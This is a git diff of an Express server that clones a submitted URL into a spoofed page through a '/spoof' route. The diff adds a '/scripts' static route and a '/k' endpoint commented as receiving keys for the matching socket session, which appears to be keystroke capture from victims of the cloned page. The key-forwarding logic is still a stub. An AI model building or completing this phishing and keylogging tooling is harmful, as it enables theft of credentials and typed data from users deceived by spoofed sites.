@@ -83,7 +83,9 @@ app.listen(PORT, (err) => {
 // MIDDLEWARE
 app.use(bodyparser.urlencoded({extended: false}))
 app.use(bodyparser.json())
+app.use('/scripts', exp.static('scripts'))
 app.use(exp.static('templates'))
+
 
 // ROUTING
 // home test
@@ -108,6 +110,14 @@ app.post('/spoof', async (req, res)=>{ // takes in post form url field, and crea
     log(`Spoof request for __ ${url_2_spoof} __`)
     let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
     return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
+})
+// receive keys
+app.post('/k', async (req, res)=>{
+    // log(req.body.key)
+
+    // handle sending the key to the correct socket session
+
+    return res.sendStatus(200)
 })
 async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
     let new_page = new Page()
